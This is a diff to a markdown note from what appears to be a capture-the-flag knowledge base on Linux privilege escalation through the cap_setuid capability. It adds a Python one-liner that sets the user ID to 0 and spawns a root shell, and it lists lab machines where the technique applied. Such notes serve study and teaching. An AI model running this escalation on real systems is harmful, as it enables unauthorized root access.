@@ -30,6 +30,12 @@ Or from an interactive Python interpreter with the capability:
 import os; os.setuid(0); os.execl("/bin/sh", "sh")
 ```
 
+The vehicle doesn't have to be a custom binary: a **stock interpreter** carrying the capability works the same way (one-liner, no file written):
+
+```sh
+python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
 ## Seen in
 
-[[los-3-hackers]] (`/usr/local/bin/syscheck cap_setuid=ep`), [[hannah-coffee]] (`/opt/priv-python cap_setuid=ep`)
+[[los-3-hackers]] (`/usr/local/bin/syscheck cap_setuid=ep`), [[hannah-coffee]] (`/opt/priv-python cap_setuid=ep`), [[cap]] (`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` — system Python one-liner)
